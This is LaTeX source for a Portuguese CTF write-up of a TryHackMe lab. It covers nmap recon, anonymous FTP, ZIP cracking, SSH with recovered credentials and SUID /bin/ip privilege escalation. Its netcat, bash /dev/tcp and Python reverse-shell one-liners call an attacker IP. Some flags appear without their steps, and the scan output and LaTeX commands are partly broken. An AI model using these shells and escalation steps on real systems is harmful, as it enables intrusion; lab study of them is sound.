
\documentclass[12pt,a4paper]{article}

% ====== PACOTES ======
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage[brazilian]{babel}
\usepackage{geometry}
\usepackage{graphicx}
\usepackage{xcolor}
\usepackage{listings}
\usepackage{hyperref}
\usepackage{fancyhdr}
\usepackage{titlesec}
\usepackage{booktabs}
\usepackage{enumitem}
\usepackage{tcolorbox}
\usepackage{fontawesome5}

\geometry{margin=2.2cm}

% ====== CORES ======
\definecolor{hogwartsgold}{HTML}{D4A843}
\definecolor{hogwartsdark}{HTML}{1A1A2E}
\definecolor{hogwartsred}{HTML}{AE0001}
\definecolor{codebg}{HTML}{0D1117}
\definecolor{codegreen}{HTML}{7EE787}
\definecolor{codegray}{HTML}{8B949E}
\definecolor{codeblue}{HTML}{79C0FF}
\definecolor{codepurple}{HTML}{D2A8FF}
\definecolor{sectionblue}{HTML}{58A6FF}

% ====== HYPERREF ======
\hypersetup{
    colorlinks=true,
    linkcolor=sectionblue,
    urlcolor=hogwartsgold,
    citecolor=hogwartsgold
}

% ====== LISTINGS ======
\lstdefinestyle{terminal}{
    backgroundcolor=\color{codebg},
    basicstyle=\ttfamily\footnotesize\color{white},
    breaklines=true,
    frame=single,
    rulecolor=\color{hogwartsgold!50!black},
    numbers=none,
    xleftmargin=8pt,
    xrightmargin=8pt,
    aboveskip=10pt,
    belowskip=10pt,
    keywordstyle=\color{codeblue},
    commentstyle=\color{codegray},
    stringstyle=\color{codegreen},
    showstringspaces=false,
    literate={á}{{\'a}}1 {é}{{\'e}}1 {í}{{\'i}}1 {ó}{{\'o}}1 {ú}{{\'u}}1
             {ã}{{\~a}}1 {õ}{{\~o}}1 {ç}{{\c{c}}}1
             {Á}{{\'A}}1 {É}{{\'E}}1 {Í}{{\'I}}1 {Ó}{{\'O}}1 {Ú}{{\'U}}1
}

% ====== TCOLORBOX ======
\tcbuselibrary{skins,breakable}


ewtcolorbox{infobox}[1][]{
    colback=hogwartsdark!5!white,
    colframe=hogwartsgold,
    fonttitle=\bfseries,
    title={#1},
    breakable,
    sharp corners,
    boxrule=1pt
}


ewtcolorbox{flagbox}{
    colback=hogwartsred!5!white,
    colframe=hogwartsred,
    fonttitle=\bfseries,
    title={\faFlag\ Flag Capturada},
    sharp corners,
    boxrule=1pt
}


ewtcolorbox{reasonbox}{
    colback=sectionblue!5!white,
    colframe=sectionblue!70!black,
    fonttitle=\bfseries,
    title={\faLightbulb[regular]\ Raciocínio},
    breakable,
    sharp corners,
    boxrule=1pt
}

% ====== HEADERS ======
\pagestyle{fancy}
\fancyhf{}
\fancyhead[L]{\small\color{codegray}CTF Hogwarts -- TryHackMe}
\fancyhead[R]{\small\color{codegray}Writeup Completo}
\fancyfoot[C]{\thepage}
\renewcommand{\headrulewidth}{0.4pt}
\renewcommand{\headrule}{\hbox to\headwidth{\color{hogwartsgold}\leaders\hrule height \headrulewidth\hfill}}

% ====== TITULOS ======
\titleformat{\section}
    {\Large\bfseries\color{hogwartsgold}}
    {\thesection.}{0.5em}{}
    [\vspace{-0.5em}\textcolor{hogwartsgold!40}{\rule{\textwidth}{0.5pt}}]

\titleformat{\subsection}
    {\large\bfseries\color{sectionblue}}
    {\thesubsection}{0.5em}{}

% =============================================
\begin{document}

% ====== CAPA ======
\begin{titlepage}
\begin{center}
\vspace*{2cm}

{\Huge\bfseries\color{hogwartsgold} \faHatWizard\ CTF Hogwarts}\\[0.5cm]
{\LARGE\color{white!60!black} Writeup Completo}\\[1cm]
{\Large\color{hogwartsred}\texttt{TryHackMe}}\\[2cm]

\textcolor{hogwartsgold!60}{\rule{0.6\textwidth}{1pt}}\\[1cm]

\begin{tabular}{rl}
    \textbf{\color{codegray}Data:} & 18 de Abril de 2026 \\[6pt]
    \textbf{\color{codegray}Alvo:} & \texttt{10.10.212.163} \\[6pt]
    \textbf{\color{codegray}Plataforma:} & TryHackMe \\[6pt]
    \textbf{\color{codegray}Dificuldade:} & Médio \\[6pt]
    \textbf{\color{codegray}Ferramentas:} & Nmap, FTP, John the Ripper, Netcat, SSH \\
\end{tabular}

\vfill
\textcolor{hogwartsgold!60}{\rule{0.6\textwidth}{1pt}}\\[0.5cm]
{\small\color{codegray} Documento gerado para fins educacionais em ambiente controlado.}
\end{center}
\end{titlepage}

% ====== SUMÁRIO ======
\tableofcontents

ewpage

% ============================================================
\section{Reconhecimento de Rede (Nmap)}
% ============================================================

O objetivo inicial foi mapear a superfície de ataque e identificar serviços em portas não convencionais.

\subsection{Comando Executado}
\begin{lstlisting}[style=terminal]
nmap -sV -sC -Pn -T4 -p- 10.10.212.163
\end{lstlisting}

\subsection{Resultado}
\begin{lstlisting}[style=terminal]
PORT      STATE SERVICE VERSION
22/tcp    open  http    Apache httpd 2.4.38 ((Debian))
9440/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
9736/tcp  open  http    PHP cli server 5.5 or later
|_http-title: Hogwart's Royal Entry
10255/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
43768/tcp open  unknown
| last sighted in hogwa
\end{lstlisting}

\begin{reasonbox}
O scan revelou serviços críticos em portas altas. O FTP (10255) permitia login anônimo e a porta 9736 rodava um servidor PHP, indicando vetores de entrada via exfiltração e web.
\end{reasonbox}

% ============================================================
\section{Exploração de FTP e Exfiltração}
% ============================================================

Acesso ao FTP anônimo na porta \textbf{10255}, listagem de diretórios ocultos (\texttt{...}) e download dos arquivos encontrados.

\subsection{Sessão FTP}
\begin{lstlisting}[style=terminal]
ftp 10.10.212.163 10255
# Login: anonymous / (sem senha)

ftp> ls -la
drwxr-xr-x    3 ftp  ftp  4096 Sep 06  2020 ..
drwxr-xr-x    2 ftp  ftp  4096 Apr 27 09:04 ...
-rw-r--r--    1 ftp  ftp   105 Sep 06  2020 GoAway.exe

ftp> get GoAway.exe
226 Transfer complete. 105 bytes received.

ftp> cd ...
250 Directory successfully changed.

ftp> ls -la
-rw-r--r--    1 ftp  ftp   231 Apr 27 09:04 .I_saved_it_harry.zip
-rw-r--r--    1 ftp  ftp   157 Sep 06  2020 note4neville

ftp> get note4neville
ftp> get .I_saved_it_harry.zip
ftp> exit
\end{lstlisting}

\subsection{Conteúdo dos Arquivos}
\begin{lstlisting}[style=terminal]
$ cat note4neville
Hagrid: Oi Neville even I ws able to open your secret file!
Yeah now change it before someone gets in.
These are troubled times, I tell ya 'roubled imes.!!

$ cat GoAway.exe
Hagrid: Oh no harry, y'are steell poking injections
around 'ere aren't ya? Go away 'arry, me tellin' ya.
\end{lstlisting}

\begin{reasonbox}
\begin{itemize}[nosep]
    \item O diretório \texttt{...} indicou conteúdo escondido no FTP.
    \item \texttt{GoAway.exe} trouxe dica explícita de \textbf{injections} $\rightarrow$ forte indicação de \textbf{SQL Injection}.
    \item \texttt{note4neville} apontou que Neville tinha um ``secret file'' (pista de credenciais).
\end{itemize}
\end{reasonbox}

% ============================================================
\section{Quebra de Senha do ZIP}
% ============================================================

O arquivo \texttt{.I\_saved\_it\_harry.zip} estava protegido por senha.

\subsection{Extração do Hash e Crack}
\begin{lstlisting}[style=terminal]
$ zip2john .I_saved_it_harry.zip > zip.hash

$ john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
anime            (.I_saved_it_harry.zip/boot/.pass)
1g 0:00:00:00 DONE
Session completed.
\end{lstlisting}

\subsection{Extração e Credenciais}
\begin{lstlisting}[style=terminal]
$ unzip .I_saved_it_harry.zip
# Senha: anime

$ cat boot/.pass
neville:ocxxbwaznnkzkymq6m7tmdykv
\end{lstlisting}

\begin{reasonbox}
A senha do ZIP era \texttt{anime}, e o arquivo \texttt{boot/.pass} revelou credenciais no formato \texttt{user:pass}, permitindo login como \textbf{neville} via SSH.
\end{reasonbox}

% ============================================================
\section{Acesso SSH como Neville}
% ============================================================

\begin{lstlisting}[style=terminal]
$ ssh neville@10.10.212.163 -p 9440
# Senha: ocxxbwaznnkzkymq6m7tmdykv

Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-1112-aws x86_64)
neville@ip-10-10-212-163:~$
\end{lstlisting}

% ============================================================
\section{Enumeração de SUID}
% ============================================================

\begin{lstlisting}[style=terminal]
$ find / -perm -u=s -type f 2>/dev/null
/etc/room_of_requirement
/bin/ip
/bin/mount
/bin/su
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/passwd
... (demais binarios padrao)
\end{lstlisting}

\begin{reasonbox}
O destaque é o \texttt{/bin/ip} com SUID, que permite abusos com \textbf{network namespaces} para obter shell privilegiada. Também há o binário custom \texttt{/etc/room\_of\_requirement}.
\end{reasonbox}

% ============================================================
\section{Escalação de Privilégio via \texttt{/bin/ip}}
% ============================================================

\begin{lstlisting}[style=terminal]
neville@ip-10-10-212-163:~$ ip netns add foo
neville@ip-10-10-212-163:~$ ip netns exec foo /bin/sh -p
# whoami
root
\end{lstlisting}

\begin{infobox}[Técnica Utilizada]
O binário \texttt{ip} com bit SUID permite criar \textit{network namespaces} e executar comandos dentro deles com privilégios elevados. O flag \texttt{-p} no \texttt{sh} preserva o effective UID (root).
\end{infobox}

% ============================================================
\section{Binário SUID Custom: \texttt{room\_of\_requirement}}
% ============================================================

\begin{lstlisting}[style=terminal]
# ls -la /etc/room_of_requirement
---Sr-sr-x 1 root root 17126 Apr 27 09:04 /etc/room_of_requirement

# strings /etc/room_of_requirement | grep -i cloak
Invisibilty cloak: m5ktp!h970#ej0@8ja4hj8l00
\end{lstlisting}

% ============================================================
\section{Reverse Shell com Netcat}
% ============================================================

Após obter acesso SSH como \textbf{neville}, uma alternativa para obter shell interativa ou pivotar na rede seria usar o \textbf{Netcat} para estabelecer uma reverse shell.

\subsection{Cenário}
\begin{itemize}[nosep]
    \item \textbf{Atacante (sua máquina):} \texttt{10.10.153.170}
    \item \textbf{Alvo (CTF):} \texttt{10.10.212.163}
    \item \textbf{Porta escolhida:} \texttt{4444}
\end{itemize}

\subsection{Passo 1 -- Listener na Máquina Atacante}
\begin{lstlisting}[style=terminal]
# Na sua maquina (atacante), abrir o listener:
$ nc -lvnp 4444
listening on [any] 4444 ...
\end{lstlisting}

\begin{infobox}[Parâmetros do Netcat]
\begin{itemize}[nosep]
    \item \texttt{-l} : modo \textit{listen} (escuta)
    \item \texttt{-v} : modo verboso
    \item \texttt{-n} : sem resolução DNS
    \item \texttt{-p 4444} : porta de escuta
\end{itemize}
\end{infobox}

\subsection{Passo 2 -- Reverse Shell a partir do Alvo}

\textbf{Opção A -- Netcat tradicional (se \texttt{nc -e} estiver disponível):}
\begin{lstlisting}[style=terminal]
neville@target:~$ nc -e /bin/bash 10.10.153.170 4444
\end{lstlisting}

\textbf{Opção B -- Netcat sem \texttt{-e} (mkfifo):}
\begin{lstlisting}[style=terminal]
neville@target:~$ rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | \
    /bin/sh -i 2>&1 | nc 10.10.153.170 4444 > /tmp/f
\end{lstlisting}

\textbf{Opção C -- Bash puro (sem Netcat no alvo):}
\begin{lstlisting}[style=terminal]
neville@target:~$ bash -i >& /dev/tcp/10.10.153.170/4444 0>&1
\end{lstlisting}

\textbf{Opção D -- Python (caso disponível):}
\begin{lstlisting}[style=terminal]
neville@target:~$ python3 -c 'import socket,subprocess,os; \
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); \
    s.connect(("10.10.153.170",4444)); \
    os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); \
    os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'
\end{lstlisting}

\subsection{Passo 3 -- Upgrade do Shell (TTY Interativo)}

Após receber a conexão no listener:
\begin{lstlisting}[style=terminal]
# No shell recebido:
$ python3 -c 'import pty; pty.spawn("/bin/bash")'

# Pressione Ctrl+Z para suspender, depois:
$ stty raw -echo; fg

# Ajuste as variaveis de ambiente:
$ export TERM=xterm
$ export SHELL=/bin/bash
$ stty rows 40 cols 120
\end{lstlisting}

\subsection{Passo 4 -- Escalar para Root via Reverse Shell}
\begin{lstlisting}[style=terminal]
# Ja dentro do reverse shell como neville:
$ ip netns add foo
$ ip netns exec foo /bin/sh -p
# whoami
root

# Capturar a flag:
# cat /root/headmaster.txt
THM{Albus_Perciva1_Wu1fric_Brian_Dumb1ed0re}
\end{lstlisting}

\begin{reasonbox}
O Netcat permite obter um shell remoto interativo, útil quando o acesso SSH é instável ou quando se precisa pivotar para outras máquinas na rede do laboratório. As opções B e C são especialmente úteis em ambientes onde o Netcat não possui a flag \texttt{-e}.
\end{reasonbox}

% ============================================================
\section{Flags Capturadas}
% ============================================================

\begin{center}
\begin{tabular}{lll}
\toprule
\textbf{Personagem} & \textbf{Localização} & \textbf{Flag} \\
\midrule
Hermione & \texttt{/home/hermoine/special\_spell.txt} & \texttt{THM\{its\_wingardium\_laviosaa\_Ron\}} \\
Harry    & \texttt{/home/harry/special\_spell.txt}    & \texttt{THM\{Yeah\_1\_swallowed\_the\_sn1tch.\}} \\
Draco    & \texttt{/home/draco/achievements.txt}      & \texttt{THM\{I\_unarm3d\_dumbled0re\}} \\
Web      & \texttt{/var/www/.../conn.php}              & \texttt{THM\{wait-for-your-letter!\}} \\
Hidden   & \texttt{/etc/left\_corridor/.../}           & \texttt{THM\{That-boy-was-Tom-Riddle\}} \\
Root     & \texttt{/root/headmaster.txt}               & \texttt{THM\{Albus\_Perciva1\_Wu1fric\_Brian\_Dumb1ed0re\}} \\
\bottomrule
\end{tabular}
\end{center}

% ============================================================
\section{Resumo da Kill Chain}
% ============================================================

\begin{enumerate}[nosep]
    \item \textbf{Reconhecimento:} Nmap full port scan identificou 5 serviços.
    \item \textbf{Enumeração FTP:} Login anônimo $\rightarrow$ diretório oculto \texttt{...} $\rightarrow$ ZIP protegido.
    \item \textbf{Crack:} John the Ripper quebrou a senha do ZIP (\texttt{anime}).
    \item \textbf{Credenciais:} Arquivo \texttt{boot/.pass} revelou \texttt{neville:ocxxbwaznnkzkymq6m7tmdykv}.
    \item \textbf{Acesso Inicial:} SSH na porta 9440 como \texttt{neville}.
    \item \textbf{Reverse Shell (Netcat):} Shell interativa via \texttt{nc} para maior controle.
    \item \textbf{Priv Esc:} \texttt{/bin/ip} SUID $\rightarrow$ \texttt{ip netns exec} $\rightarrow$ root.
    \item \textbf{Flags:} 6 flags capturadas em diversos locais do sistema.
\end{enumerate}

\vfill
\begin{center}
\textcolor{hogwartsgold!60}{\rule{0.5\textwidth}{0.5pt}}\\[0.3cm]
{\small\color{codegray}\faShieldAlt\ Este documento foi criado para fins educacionais.\\
Ambiente controlado TryHackMe -- uso autorizado.}
\end{center}

\end{document}

